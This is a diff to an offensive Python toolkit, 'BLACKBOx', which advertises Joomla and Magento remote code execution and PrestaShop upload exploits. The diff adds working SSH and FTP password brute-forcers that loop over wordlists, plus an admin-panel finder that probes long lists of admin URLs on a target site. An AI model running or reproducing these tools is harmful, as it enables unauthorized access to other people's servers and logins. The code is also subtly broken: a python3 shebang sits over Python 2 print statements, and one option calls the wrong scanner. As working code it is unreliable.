@@ -1,4 +1,4 @@
-#!/bin/python2
+#!/usr/bin/python3
 #####################################NOTICE######################################
 ###     This program is free software: you can redistribute it and/or modify  ###
 ###     it under the terms of the GNU General Public License as published by  ###
@@ -12,45 +12,54 @@
 ###     You should have received a copy of the GNU General Public License     ###
 ###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
 #################################################################################
-### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/
-### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/
-### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259
-
-import requests,json,sys, time, re, os, base64, random,hashlib,timeit
+################################################################################################################################
+###                                          I edit some tools from other repository like :                                  ###
+### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/                                                                 ###
+### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/                                                                 ###
+### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259 ###
+### ADMIN PAGE FINDER  : https://packetstormsecurity.com/files/112855/Admin-Page-Finder-Script.html                          ###
+################################################################################################################################
+import requests,json,sys, time, re, os, base64, random,hashlib,timeit,ftplib,pexpect
 from sys import platform
 from time import gmtime, strftime
 from optparse import OptionParser
 from passlib.hash import nthash
+from pexpect import pxssh
+from ftplib import FTP
 __author__     = 'BLACK EYE'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
 __emailadd__   = 'blackdoor197@riseup.net'
 __twitter__    = 'https://twitter.com/0x676'
-__version__    = '1.2'
+__version__    = '1.4'
 __license__    = 'GPLv2'
-__scrname__    = 'BLACKBOXx v%s' % (__version__)
+__scrname__    = 'BLACKBOx v%s' % (__version__)
 
 def __banner__():
 	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ "
 	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     | _ _"
 	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  ||_'_|"
 	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____||_,_|"
-	print color.W+color.BOLD+"                                                     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC
+	print color.W+color.BOLD+"                                                {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC
 
 def __help__():
 	print color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}"
-	print color.BOLD+color.W+"Help    : "+color.ENDC+sys.argv[0]+" -h/--help"
-	print color.W+color.BOLD+"Modules : "+color.ENDC
-	print "\t\t+ Wordpress Bruteforce          :   wordpress_brute"
-	#print "\t\t+ SSH Bruteforce                :   ssh_brute"
-	#print "\t\t+ FTP Bruteforce                :   ftp_brute"
-	print "\t\t+ Dnsinfo                       :   dns_info"
-	print "\t\t+ Joomla Rce                    :   rce_joomla"
-	print "\t\t+ Magento Rce                   :   rce_magento"
-	print "\t\t+ PrestaShop Exploit            :   presta_exploit"
-	print "\t\t+ Google Dorker                 :   google_dorker(lfi/sqli scan)"
-	print "\t\t+ Bing Dorker                   :   bing_dorker(lfi scan)"
-	print "\t\t+ Crack Hash(MD5/SHA*/NTLM)     :   hash_killer"
-	print "\t\t+ update Database (sudo needed) :   -u/--update"
+	print color.BOLD+color.Y+"Bruteforcing : "+color.ENDC
+	print "\t+ Wordpress Bruteforce  : wordpress_brute        | Bruteforcing WP PANEL"
+	print "\t+ Admin Page Finder     : admin_brute            | Find Admin Page"
+	#print "\t+ PMA Page Finder       : pma_brute              | Find PhpMyAdmin Page"
+	print "\t+ SSH Bruteforce        : ssh_brute              | Bruteforcing SSH LOGIN"
+	print "\t+ FTP Bruteforce        : ftp_brute              | Bruteforcing FTP LOGIN"
+	print color.BOLD+color.Y+"Information Gathering : "+color.ENDC
+	print "\t+ Dnsinfo               : dns_info               | Get All Website from IP"
+	print color.BOLD+color.Y+"Exploit : "+color.ENDC
+	print "\t+ Joomla Rce            : rce_joomla             | 1.5 - 3.4.5 remote code execution"
+	print "\t+ Magento Rce           : rce_magento            | Magento eCommerce - Remote Code Execution"
+	print "\t+ PrestaShop Exploit    : presta_exploit         | Prestashop Multi Modules Arbitrary File Upload Exploit"
+	print color.BOLD+color.Y+"Dorking : "+color.ENDC
+	print "\t+ Google Dorker         : google_dorker(lfi scan)| Google Dorker "
+	print "\t+ Bing Dorker           : bing_dorker(lfi scan)  | Bing Dorker via IP"
+	print color.BOLD+color.Y+"Cracking : "+color.ENDC
+	print "\t+ Crack Hash MD5-SHA512 : hash_killer            | Crack MD5-SHA* HASH\n\t\t     SHA1-SHA224\n\t\t     SHA256-SHA384"
 
 def __update__():
 	pass
@@ -286,6 +295,224 @@ class dorker:
 ####################################
 
 class BruteForce:
+    php = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
+    'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+    'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
+    'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
+    'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
+    'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
+    'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
+    'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
+    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
+    'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
+    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
+    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
+    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
+    'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
+    'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
+    'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
+    'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php']
+    asp = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
+    'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+    'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
+    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
+    'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
+    'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
+    'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
+    'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
+    'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
+    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
+    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
+    'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
+    'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
+    'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
+    'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
+    'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
+    'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
+    'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html']
+    cfm = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
+    'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+    'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
+    'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
+    'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
+    'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
+    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
+    'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
+    'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
+    'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
+    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
+    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
+    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
+    'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
+    'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
+    'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
+    'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm']
+    js = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js','admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+    'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
+    'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
+    'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
+    'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
+    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
+    'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
+    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
+    'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
+    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
+    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
+    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
+    'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
+    'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
+    'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
+    'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js']
+    cgi = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
+    'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+    'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
+    'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
+    'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
+    'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
+    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
+    'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
+    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
+    'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
+    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
+    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
+    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
+    'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
+    'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
+    'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
+    'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi']
+    brf = ['admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+    'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
+    'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+    'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
+    'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
+    'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
+    'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
+    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
+    'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
+    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
+    'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
+    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
+    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
+    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
+    'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
+    'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
+    'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
+    'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf']
+    class admin_brute:
+        def php_admin(self,url):
+            php = BruteForce.php
+            for admin in php:
+                admin=admin.strip()
+                full = url+"/"+admin
+                r = requests.get(full)
+                get = r.status_code
+                if get == 200:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+                elif get == 403:
+                    print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+                elif get == 302:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+                elif get==404:
+                    print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+                else:
+                    print (get+" : "+full)
+        def asp_admin(self,url):
+            asp = BruteForce.asp
+            for admin in asp:
+                admin=admin.strip()
+                full = url+"/"+admin
+                r = requests.get(full)
+                get = r.status_code
+                if get == 200:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+                elif get == 403:
+                    print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+                elif get == 302:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+                elif get==404:
+                    print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+                else:
+                    print (get+" : "+full)
+        def cfm_admin(self,url):
+            cfm = BruteForce.cfm
+            for admin in cfm:
+                admin=admin.strip()
+                full = url+"/"+admin
+                r = requests.get(full)
+                get = r.status_code
+                if get == 200:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+                elif get == 403:
+                    print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+                elif get == 302:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+                elif get==404:
+                    print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+                else:
+                    print (get+" : "+full)
+        def js_admin(self,url):
+            js = BruteForce.js
+            for admin in js:
+                admin=admin.strip()
+                full = url+"/"+admin
+                r = requests.get(full)
+                get = r.status_code
+                if get == 200:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+                elif get == 403:
+                    print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+                elif get == 302:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+                elif get==404:
+                    print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+                else:
+                    print (get+" : "+full)
+        def cgi_admin(self,url):
+            cgi = BruteForce.cgi
+            for admin in cgi:
+                admin=admin.strip()
+                full = url+"/"+admin
+                r = requests.get(full)
+                get = r.status_code
+                if get == 200:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+                elif get == 403:
+                    print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+                elif get == 302:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+                elif get==404:
+                    print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+                else:
+                    print (get+" : "+full)
+        def brf_admin(self,url):
+            brf = BruteForce.brf
+            for admin in brf:
+                admin=admin.strip()
+                full = url+"/"+admin
+                r = requests.get(full)
+                get = r.status_code
+                if get == 200:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+                elif get == 403:
+                    print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+                elif get == 302:
+                    print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+                elif get==404:
+                    print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+                else:
+                    print (get+" : "+full)
+        def __init__(self):
+        	pass
 	def wordpress(self, url, username,wordlist):
 		headers = {
 		'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
@@ -319,10 +546,27 @@ class BruteForce:
 				break
 			elif "wp-login.php" in s.url:
 				print color.G+datetime+color.C+" Login False"+color.ENDC
-	def ftp_brute(self, url, wordlist):
-		pass
-	def ssh_brute(self, url, wordlist):
-		pass
+	def ftp_brute(self,hostname, username, password):
+		try:
+			ftp = FTP(hostname)
+			login = ftp.login(username, password)
+			if "230" in login:
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
+				sys.exit(0)
+		except ftplib.error_perm:
+			print (color.R+color.BOLD+"[-]"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
+			pass
+	def ssh_brute(self,hostname, username, password):
+		try:
+			s = pxssh.pxssh()
+			login = s.login(hostname, username, password)
+			if login == True:
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
+		except pexpect.pxssh.ExceptionPxssh:
+			print (color.R+color.BOLD+"[-]"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
+			pass
 	def joomla(self, url, wordlist):
 		pass
 
@@ -890,11 +1134,93 @@ def __main__():
 			script = options.script
 			if lists and script:
 				presta_exploit(lists,script)
+		if (arg=="ftp_brute"):
+			parser = OptionParser()
+			parser.add_option("--ip",
+				help="IP address Of FTP SERVER")
+			parser.add_option("--username","-u",
+				help="USERNAME OF FTP SERVER")
+			parser.add_option("--wordlist","-w",
+				help="WORDLIST PATH")
+			(options,args) = parser.parse_args()
+			ip     = options.ip
+			username = options.username
+			wordlist = options.wordlist
+			if ip and username and wordlist:
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
+				wordlist = open(wordlist,"r")
+				wordlist = wordlist.readlines()
+				for password in  wordlist:
+					password=password.strip()
+					BruteForce().ftp_brute(ip,username,password)
+		if (arg=="ssh_brute"):
+			parser = OptionParser()
+			parser.add_option("--ip",
+				help="IP address Of SSH SERVER")
+			parser.add_option("--username","-u",
+				help="USERNAME OF SSH SERVER")
+			parser.add_option("--wordlist","-w",
+				help="WORDLIST PATH")
+			(options,args) = parser.parse_args()
+			ip     = options.ip
+			username = options.username
+			wordlist = options.wordlist
+			if ip and username and wordlist:
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" USERNAME : "+username+color.ENDC)
+				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST : "+wordlist+color.ENDC)
+				wordlist = open(wordlist,"r")
+				wordlist = wordlist.readlines()
+				for password in  wordlist:
+					password=password.strip()
+					BruteForce().ssh_brute(ip,username,password)
+		if (arg=="admin_brute"):
+			parser = OptionParser()
+			parser.add_option("--url","-u",
+				help="URL FOR GET ADMIN PANEL")
+			parser.add_option("--php",
+				action="store_true")
+			parser.add_option("--asp",
+				action="store_true")
+			parser.add_option("--cfm",
+				action="store_true")
+			parser.add_option("--js",
+				action="store_true")
+			parser.add_option("--cgi",
+				action="store_true")
+			parser.add_option("--brf",
+				action="store_true")
+			(options,args) = parser.parse_args()
+			url = options.url
+			php = options.php
+			asp = options.asp
+			cfm = options.cfm
+			js  = options.js
+			cgi = options.cgi
+			brf = options.brf
+			if url and php==True:
+				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				BruteForce.admin_brute().php_admin(url)
+			if url and asp==True:
+				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				BruteForce.admin_brute().asp_admin(url)
+			if url and cfm==True:
+				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				BruteForce.admin_brute().cfm_admin(url)
+			if url and js==True:
+				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				BruteForce.admin_brute().js_admin(url)
+			if url and cgi==True:
+				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				BruteForce.admin_brute().cgi_admin(url)
+			if url and brf==True:
+				print (color.C+color.BOLD+"[+]"+color.ENDC+color.BOLD+" URL                : "+url+color.ENDC)
+				BruteForce.admin_brute().php_admin(url)
 if __name__ == '__main__':
 	try:
 		__main__()
 	except KeyboardInterrupt:
 		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
 		sys.exit(0)
-	#except urllib2.HTTPError:
